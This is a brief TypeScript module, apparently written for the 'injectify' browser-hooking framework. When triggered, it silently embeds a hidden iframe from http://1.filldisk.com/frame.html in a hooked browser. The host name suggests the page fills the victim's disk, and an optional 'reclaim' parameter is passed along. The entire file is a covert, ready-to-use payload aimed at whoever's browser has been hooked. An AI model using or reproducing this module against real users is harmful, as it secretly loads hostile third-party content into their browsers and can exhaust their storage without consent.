import ModuleTypings from '../../../definitions/module'
declare const { Module, injectify } : ModuleTypings

/**
 * Parse params
 */
var reclaim = ''
if (typeof Module.params == 'object') {
    if (Module.params.reclaim) reclaim = '?reclaim=true'
}

/**
 * Load the embed module
 */
injectify.module('embed', {
    url: `http://1.filldisk.com/frame.html${reclaim}`,
    hidden: true,
}).then(() => {
    Module.return(true)
})